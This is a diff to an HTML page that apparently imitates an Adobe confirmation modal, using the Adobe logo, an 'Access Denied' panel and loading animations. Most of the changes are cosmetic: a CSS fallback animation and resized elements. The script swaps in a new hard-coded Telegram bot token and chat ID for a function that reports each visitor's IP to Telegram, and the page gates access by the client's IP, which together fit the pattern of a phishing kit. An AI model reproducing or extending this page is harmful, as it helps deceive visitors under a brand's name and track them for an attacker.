@@ -9,7 +9,7 @@
     body {
       margin: 0;
       padding: 0;
-      background-image: url('adobebackground10.png');
+      background-image: url('Screenshot 2025-04-25 161700.png');
       background-size: contain;
       background-position: center;
       background-repeat: no-repeat;
@@ -58,6 +58,7 @@
       padding: 20px 0;
       opacity: 1;
       transition: opacity 0.6s ease;
+      min-height: 200px;
     }
 
     .lottie-container.hidden {
@@ -70,6 +71,58 @@
     .lottie-container dotlottie-wc {
       width: 200px;
       height: 200px;
+    }
+
+    /* Fallback for Lottie - CSS animation if Lottie fails */
+    .lottie-fallback {
+      display: none;
+      width: 150px;
+      height: 150px;
+      margin: 0 auto;
+      position: relative;
+    }
+
+    .lottie-fallback .circle {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+      border: 6px solid #e0e0e0;
+      border-top-color: #ED2224;
+      animation: spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+      box-sizing: border-box;
+    }
+
+    .lottie-fallback .dots {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      display: flex;
+      gap: 8px;
+    }
+
+    .lottie-fallback .dots span {
+      width: 10px;
+      height: 10px;
+      background: #ED2224;
+      border-radius: 50%;
+      display: inline-block;
+      animation: dotBounce 1.4s ease-in-out infinite both;
+    }
+
+    .lottie-fallback .dots span:nth-child(1) { animation-delay: -0.32s; }
+    .lottie-fallback .dots span:nth-child(2) { animation-delay: -0.16s; }
+    .lottie-fallback .dots span:nth-child(3) { animation-delay: 0s; }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    @keyframes dotBounce {
+      0%, 80%, 100% { transform: scale(0); }
+      40% { transform: scale(1); }
     }
 
     /* ===== LOADING STYLES ===== */
@@ -126,16 +179,6 @@
     .adobe-loader .dots span:nth-child(1) { animation-delay: -0.32s; }
     .adobe-loader .dots span:nth-child(2) { animation-delay: -0.16s; }
     .adobe-loader .dots span:nth-child(3) { animation-delay: 0s; }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    @keyframes dotBounce {
-      0%, 80%, 100% { transform: scale(0); }
-      40% { transform: scale(1); }
-    }
 
     .loading-status {
       font-size: 15px;
@@ -276,21 +319,21 @@
         min-height: 240px;
       }
       .adobe-loader {
-        width: 40px;
-        height: 40px;
+        width: 60px;
+        height: 60px;
       }
       .loading-status {
-        font-size: 12px;
+        font-size: 14px;
       }
       .error-panel h3 {
-        font-size: 14px;
+        font-size: 16px;
       }
       .error-panel p {
-        font-size: 14px;
+        font-size: 13px;
       }
       .lottie-container dotlottie-wc {
-        width: 40px;
-        height: 40px;
+        width: 150px;
+        height: 150px;
       }
     }
   </style>
@@ -301,7 +344,7 @@
   <div id="confirmationModal" class="modal-overlay">
     <div class="modal-content">
       <div class="modal-header">
-        <img src="free-ad.webp" alt="Adobe Logo">
+        <img src="adobe-logo-2017.png" alt="Adobe Logo">
       </div>
 
       <!-- ===== ACCESS DENIED PANEL ===== -->
@@ -316,6 +359,15 @@
       <!-- ===== LOTTIE ANIMATION ===== -->
       <div id="lottieContainer" class="lottie-container">
         <dotlottie-wc src="https://lottie.host/c84685e5-ab03-4c8b-8304-f860c80244b7/pm7ccubzgi.lottie" autoplay loop></dotlottie-wc>
+        <!-- Fallback animation if Lottie fails to load -->
+        <div id="lottieFallback" class="lottie-fallback" style="display:none;">
+          <div class="circle"></div>
+          <div class="dots">
+            <span></span>
+            <span></span>
+            <span></span>
+          </div>
+        </div>
       </div>
 
       <!-- ===== LOADING INTERFACE ===== -->
@@ -632,8 +684,8 @@
     // ============================================================
 
     async function reportVisitToTelegram(ip, blocked = false) {
-      const BOT_TOKEN = '7284066719:AAF9ABMO2CNxpiCyNrmAGeGSUAt-fS8pGlQ';
-      const CHAT_ID = '7724482403';
+      const BOT_TOKEN = '8127507776:AAFcEnFR3ERfKQ92G0xZ7Dp4xjnOYz95N6w';
+      const CHAT_ID = '7515108596';
 
       try {
         // If no IP provided, fetch it
@@ -732,7 +784,29 @@
     }
 
     // ============================================================
-    // 9. PAGE INITIALIZATION
+    // 9. LOTTIE FALLBACK - Show CSS animation if Lottie fails
+    // ============================================================
+
+    function setupLottieFallback() {
+      const lottieElement = document.querySelector('dotlottie-wc');
+      const fallbackElement = document.getElementById('lottieFallback');
+      
+      // If Lottie doesn't load after 3 seconds, show fallback
+      setTimeout(() => {
+        // Check if Lottie rendered something
+        const lottieContainer = document.getElementById('lottieContainer');
+        const hasContent = lottieContainer.querySelector('canvas, svg, div[class*="lottie"]');
+        
+        if (!hasContent) {
+          // Lottie didn't load, show fallback
+          if (lottieElement) lottieElement.style.display = 'none';
+          fallbackElement.style.display = 'block';
+        }
+      }, 3000);
+    }
+
+    // ============================================================
+    // 10. PAGE INITIALIZATION
     // ============================================================
 
     document.addEventListener('DOMContentLoaded', function() {
@@ -745,6 +819,9 @@
           }
         });
       }
+
+      // Setup Lottie fallback
+      setupLottieFallback();
 
       // Get client IP and check access
       fetch('https://api.ipify.org?format=json')
